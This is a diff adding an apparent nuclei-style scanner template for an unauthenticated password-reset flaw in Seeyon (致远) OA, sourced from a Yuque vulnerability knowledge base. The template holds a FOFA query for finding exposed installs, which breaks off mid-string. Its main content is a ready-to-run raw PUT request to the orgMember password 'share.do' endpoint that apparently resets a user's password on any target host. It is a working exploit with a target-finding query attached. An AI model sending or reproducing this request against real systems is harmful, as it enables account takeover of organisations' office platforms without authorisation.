@@ -1,0 +1,27 @@
+id: poc-qcipqvc35mioeey0
+info:
+  name: 致远OA rest存在前台密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qcipqvc35mioeey0'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qcipqvc35mioeey0
+    fofa: (title="致远" && title="协同管理软件") || body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || (body="/seeyon/common/" && body="var _ctxpath = '/seeyon'") || (body="-V5企业版" && body="seeyon" && body="seeyonProdu
+http:
+- raw:
+  - 'PUT /seeyon/rest/orgMember/-4401606663639775639/password/share.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+    Content-Length: 0
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
